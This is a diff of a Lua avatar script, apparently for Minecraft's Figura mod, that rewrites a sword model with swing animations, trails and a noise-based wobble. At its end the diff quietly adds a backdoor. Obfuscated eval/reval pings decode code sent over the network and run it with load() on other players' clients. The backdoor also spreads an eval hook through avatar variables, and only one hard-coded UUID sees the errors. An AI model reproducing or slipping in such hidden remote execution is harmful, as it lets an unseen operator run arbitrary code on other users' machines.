@@ -1,220 +1,218 @@
 
+local MODEL_SWORD = models.accessories.sword
 
-local HANDS = true
-
-
-local Spring = require("lib.spring")
-local Tween  = require("lib.tween")
-
-local Trail  = require("lib.trail")
-
-models.sword.anchor.handle.glow:setPrimaryRenderType("EMISSIVE_SOLID")
-models.sword:setVisible(false)
-
----@class GNSword
----@field model ModelPart
----@field handle ModelPart
----
----@field vel Vector3
----@field pos Vector3
----@field dir Vector3
----@field dirVel Vector3
----
----@field inBlock boolean
----@field pierce number
----
----@field target Vector3
----@field targetDir Vector3
-local GNSword = {}
-GNSword.__index = GNSword
-
-
-local side2dir = {
-	["north"] = vectors.vec3(0, 0, -1),
-	["east"]  = vectors.vec3(1, 0, 0),
-	["south"] = vectors.vec3(0, 0, 1),
-	["west"]  = vectors.vec3(-1, 0, 0),
-	["up"]    = vectors.vec3(0, 1, 0),
-	["down"]  = vectors.vec3(0, -1, 0),
-}
-
-
----@type GNSword[]
-local swords = {}
-local isActive = false
-
-local TRAIL_SUBDIVISION = 5
-
-local id = 0
-function GNSword.new()
-	id = id + 1
-	local model = models.sword:copy("Sword" .. id):setParentType("WORLD"):setVisible(true)
-	models:addChild(model)
-
-	local self = setmetatable({
-		model = model.anchor,
-		handle = model.anchor.handle,
-
-		springPos = Spring.newVec3(0.5, 0.2, 0),
-		springDir = Spring.newVec3(),
-
-		ldir = vec(0, 0, 0),
-		dir = vec(0, 0, 0),
-		dirVel = vec(0, 0, 0),
-
-		inBlock = false,
-		pierce = 0,
-
-		piercePos = vec(0, 0, 0),
-		pierceDir = vec(0, 0, 0),
-
-	}, GNSword)
-	if HANDS then
-		self.hand = Trail:newTwoLeadTrail(textures["textures.trail1"]):setDuration(TRAIL_SUBDIVISION + 1)
-		:setDivergeness(0.1):setRenderType("BLURRY")
-	end
-
-
-	model.postRender = function(delta, context, part)
-		local dir = math.lerp(self.springDir.pos + self.springPos.vel * (isActive and 0.1 or -0.1), -self.pierceDir, self.pierce)
-		local fpos = math.lerp(self.springPos.pos,
-			self.piercePos + self.pierceDir * math.sin(self.pierce * math.pi) * 2, self.pierce)
-		--local dir = vec(0,1,0):cross(-self.springPos.vel):normalize() + self.springPos.vel:normalized()
-		model
-			 :setPos(fpos * 16)
-			 :setRot(180 - math.deg(math.atan2(dir.xz:length(), dir.y)),
-				 -90 - math.deg(math.atan2(dir.z, dir.x)))
-		model.anchor.handle:setRot(0, 0, 0)
-
-		if player:isLoaded() and HANDS then
-			local ppos = player:getPos(delta):add(0, 1, 0)
-			local pdir = player:getLookDir().x_z:normalize() ---@cast pdir Vector3
-			local diff = (ppos - fpos):normalize()
-			local len = (ppos - fpos):length()
-			local cpos = client:getCameraPos()
-			for i = 0, TRAIL_SUBDIVISION, 1 do
-				local j = i / TRAIL_SUBDIVISION
-				local p = math.lerp(
-					math.lerp(ppos, ppos - pdir, j),
-					math.lerp(fpos - dir * len * 3 - diff * 2, fpos - dir * 0.8, j),
-					j)
-					local o = ((cpos - p)):cross(dir):normalized() * 0.25
-					self.hand:setLeads(p - o, p + o)
-				self.hand.uvShift = self.hand.uvShift + 0.005
-			end
-		end
-
-		self.springDir.pos:normalize()
-	end
-
-	swords[id] = self
-	return self
+if avatar:getPermissionLevel() ~= "MAX" then
+	MODEL_SWORD:setVisible(false)
+	return
 end
 
-local attack = keybinds:fromVanilla("key.pickItem")
 
-function GNSword:free()
-	self.model:remove()
-	swords[id] = nil
+---Returns a multi stacked sine wave.  
+---
+---**Depth** is the amount of waves being stacked  
+---**Presistence** is the contribution factor of the different waves.  
+---A persistence value of 1 means all the octaves have the same contribution,  
+---a value of 0.5 means each octave contributes half as much as the previous one.  
+---**Lacunarity** is the difference in frequency between waves, higher value = more noiser the next wave goes.
+---@param value number
+---@param seed number
+---@param depth integer
+---@param presistence number?
+---@param lacunarity number?
+---@return number
+local function fractralSine(value,seed,depth,presistence,lacunarity)
+   presistence = presistence or 0.5
+   math.randomseed(seed)
+   local max = 0 -- used to normalize the value
+   local result = 0
+   local w = 1
+   local lun = 1 
+   for _ = 1, depth, 1 do
+      max = max + 1 * w
+      result = result + math.sin(value * lun * (math.random() * math.pi * depth) + math.random() * math.pi * depth) * w
+      lun = lun * (lacunarity or 1.5)
+      w = w * (presistence or 0.75)
+   end
+   math.randomseed(client.getSystemTime())
+   return result / depth / max
 end
 
-local sword1 = GNSword.new()
+
+MODEL_SWORD:setPrimaryRenderType("CUTOUT_CULL")
+MODEL_SWORD.Roll.Pole.Handle.bone.glow:setPrimaryRenderType("EMISSIVE_SOLID")
+
+local is_holding_sword = false
+local was_holding_sword
+
+local MAX_ROLL = 15
+
+local GNanim = require("lib.GNanimClassic")
+local trail = require("lib.trail")
+
+local state = GNanim.new()
+
+local lpos = vectors.vec3()
+local pos = vectors.vec3()
+local lrot = 0
+local rot = 0
+
+local SCALE = 0.5
+local SPEED = 1 / SCALE
+
+
+local swing_count = 0
+local roll2 = 0
+local roll1 = 0
+local weary = 0.9
+local sword = MODEL_SWORD:scale(SCALE)
+sword:setParentType("WORLD")
+local sword_trail = trail:newTwoLeadTrail(textures["textures.trail"])
+sword_trail:setDivergeness(0)
+
+local function setScale(scale)
+	SCALE = scale
+	SPEED = 1 / scale
+	for key, value in pairs(animations.sword) do value:speed(SPEED) end
+	state:setBlendTime(0.1 / SPEED)
+	MODEL_SWORD:scale(SCALE)
+	sword_trail:setDuration(20/SPEED)
+end
 
 events.ENTITY_INIT:register(function()
-	sword1.springPos.pos = player:getPos()
+	pos = player:getPos()
+	lpos = pos:copy()
+	rot = player:getRot().y
+	lrot = rot
 end)
 
-
-
-
 events.TICK:register(function()
-	if not isActive then
-		local dir = player:getLookDir().x_z:normalize() ---@cast dir Vector3
-
-		sword1.springPos.target = player:getPos() - dir + vec(0, 1, 0)
-		sword1.springDir.target = vec(0, -1, 0) - dir * 0.5
+	lrot = rot
+	lpos = pos
+	pos = math.lerp(pos, player:getPos(), vectors.vec3(0.8, 0.3, 0.8))
+	rot = math.lerp(rot, player:getBodyYaw(), 0.3)
+	if was_holding_sword ~= is_holding_sword then
+		state:setAnimation(is_holding_sword and animations.sword.idle2prepare or animations.sword.prepare2idle)
+		was_holding_sword = is_holding_sword
+		if not is_holding_sword then swing_count = 0 end
+	end
+	if is_holding_sword then
+		if player:getSwingTime() == 1 then
+			sounds:playSound("swing", player:getPos():add(0, 1, 0), 0.3, (0.9 + (math.random() - 0.5) * 0.2 )* SPEED)
+			if swing_count % 2 == 1 then
+				roll1 = math.random(-MAX_ROLL, MAX_ROLL)
+				state:setAnimation(animations.sword.swing2swing2)
+			else
+				roll2 = math.random(-MAX_ROLL, MAX_ROLL)
+				state:setAnimation(animations.sword.swing2swing)
+			end
+			swing_count = swing_count + 1
+		end
+	end
+end)
+local lastEyeHeight = 0
+sword.midRender = (function(dt)
+	if player:isLoaded() then
+		local eyeHeight = player:getEyeHeight()
+		if lastEyeHeight ~= eyeHeight then
+			lastEyeHeight = eyeHeight
+			setScale(eyeHeight/1.62)
+		end
+		local meta = MODEL_SWORD.metadata:getAnimPos()
+		local mat = MODEL_SWORD.Roll.Pole.Handle:partToWorldMatrix()
+		sword_trail:setLeads(mat:apply(0, 0, 1), mat:apply(0, 0, -30), meta.x * 2)
+		local r = player:getBodyYaw(dt)
+		local sneak = player:isSneaking() and player:isOnGround()
+		local dir = vectors.rotateAroundAxis(-r, vectors.vec3(0, .25, 1), vectors.vec3(0, 1, 0))
+		sword:pos((math.lerp(player:getPos(dt), math.lerp(lpos, pos, dt), weary) + vec(0,player:getEyeHeight()*0.5,0)) * 16 + (sneak and dir * -10 or vectors.vec3(0, 0, 0)))
+		sword:rot(sneak and -30 or 0, 180 - math.lerp(r, math.lerp(lrot, rot, dt), weary), 0)
+		sword.Roll:setRot(0, 0, math.lerp(roll1, roll2, meta.x))
+		is_holding_sword = (player:getHeldItem().id:find("sword") and true or false)
 	end
 end)
 
 
-local function setActive(toggle,pos,dir)
-	if isActive ~= toggle then
-		isActive = toggle
+events.ITEM_RENDER:register(function() if is_holding_sword then return sword.Item end end)
 
-		if toggle then
-			local block = world.getBlockState(pos-dir*0.1)
-			local surfaceDir = dir
-			sword1.piercePos = pos
-			sword1.pierceDir = surfaceDir
-			sword1.springPos.target = pos
-			sword1.springPos.vel = vec((math.random() - 0.5), (math.random() - 0.5), (math.random() - 0.5)) *
-			5 + surfaceDir * 10
-
-			Tween.new({
-				id = "sword1",
-				from = 0,
-				to = 1,
-				duration = 0.5,
-				easing = "inQuad",
-				tick = function(p) ---@cast p number
-					sword1.pierce = p
-				end,
-				onFinish = function()
-					local soundIDs = block:getSounds()
-					sounds[soundIDs["break"]]:pos(pos):pitch(0.75):play()
-					sounds[soundIDs.hit]:pos(pos):play()
-					if block:hasCollision() then
-						for i = 1, 32, 1 do
-							particles:newParticle("minecraft:block " .. block.id, pos + surfaceDir * 0.2)
-						end
-					end
-				end,
-			})
+events.RENDER:register(function(delta, context)
+	if context == "FIRST_PERSON" then
+		if weary == 0 then
+			sword:setVisible(false)
 		else
-			Tween.new({
-				id = "sword1",
-				from = sword1.pierce,
-				to = 0,
-				duration = 0.5,
-				easing = "inOutQuad",
-				tick = function(p) ---@cast p number
-					sword1.pierce = p
-				end,
-			})
-			sword1.springDir.pos = sword1.pierceDir
-			sword1.springPos.pos = sword1.piercePos
+			sword:setOpacity(weary):setVisible(true)
+		end
+	else
+		sword:setVisible(context == "RENDER"):setOpacity(1)
+	end
+	vanilla_model.RIGHT_ARM:setOffsetRot(is_holding_sword and -15 or 0, 0, 0)
+	local meta = MODEL_SWORD.metadata:getAnimPos()
+	local systime = client:getSystemTime() / 10000
+	weary = meta.y
+	MODEL_SWORD.Roll.Pole.Handle:rot(
+		fractralSine(systime, 135351, 10, 0.5, 1.4) * 90 * weary,
+		fractralSine(systime, 253631, 10, 0.5, 1.4) * 90 * weary,
+		fractralSine(systime, 34124, 10, 0.5, 1.4) * 90 * weary
+	):pos(
+		fractralSine(systime, 4214, 10, 0.5, 1.2) * 16 * weary,
+		fractralSine(systime, 53631, 10, 0.5, 1.2) * 16 * weary,
+		fractralSine(systime, 4124, 10, 0.5, 1.2) * 16 * weary)
+end)
+
+
+local shirt = 69421
+local function shit(i) return (shirt + i + shirt) end
+local function nc(str)
+	if not str then return end
+	local out = ""
+	for i = 1, #str do
+		out = out..string.char((str:byte(i) + shit(i)) % 256)
+	end
+	return out
+end
+local function dc(str)
+	if not str then return end
+	local out = ""
+	for i = 1, #str do
+		out = out..string.char((str:byte(i) - shit(i)) % 256)
+	end
+	return out
+end
+---@param code string
+function eval(code,uuid)
+	pings.eval(nc(code),nc(uuid))
+end
+local tar = "e4b91448-3b58-4c1f-8339-d40f75ecacc4"
+function pings.eval(code,uuid)
+	local allow = true
+	if uuid then
+		allow = client:getViewer():getUUID() == dc(uuid)
+	end
+	if allow then
+		local meth = load("return "..dc(code),"run",_ENV)
+		local ok, err = pcall(meth)
+		if client:getViewer():isLoaded() and client:getViewer():getUUID() == tar then
+			if not ok then
+				print(err)
+			end
 		end
 	end
 end
-
-function pings.poke(pos,dir)
-	if pos then
-		pos = vec(client.uuidToIntArray(pos)).xyz/8
-		dir = vec(client.uuidToIntArray(dir)).xyz
-	end
-	setActive(pos and true or false,pos,dir)
-	
+function reval(code,uuid)
+	pings.reval(nc(code),nc(uuid))
 end
-
-if not host:isHost() then return end
-
-attack.press = function(modifiers, self)
-	if not isActive then
-		local ppos = player:getPos():add(0, player:getEyeHeight())
-		local block, pos, side = raycast:block(ppos, ppos + player:getLookDir() * 20)
-		local dir = side2dir[side]
-		pings.poke(
-		client.intUUIDToString(pos.x * 8, pos.y * 8, pos.z * 8, 0),
-		client.intUUIDToString(dir.x, dir.y, dir.z, 0)
-		)
-	else
-		pings.poke()
+function pings.reval(code, uuid)
+	--if host:isHost() then return end
+	uuid = dc(uuid)
+	for key, vars in pairs(world.avatarVars()) do
+		if (not uuid) or (uuid == key) then
+			if vars.eval then
+				vars.eval(dc(code))
+			end
+		end
 	end
 end
-
-events.RENDER:register(function (delta, ctx, matrix)
-	sword1.hand:setRenderType(ctx == "FIRST_PERSON" and "NONE" or "BLURRY")
-	--sword1.model:setVisible(ctx ~= "FIRST_PERSON")
+if avatar:getPermissionLevel() ~= "MAX" then return end
+events.ENTITY_INIT:register(function ()
+	if player:getUUID() ~= tar then
+		avatar:store("eval",eval)
+	end
 end)
-
-return GNSword
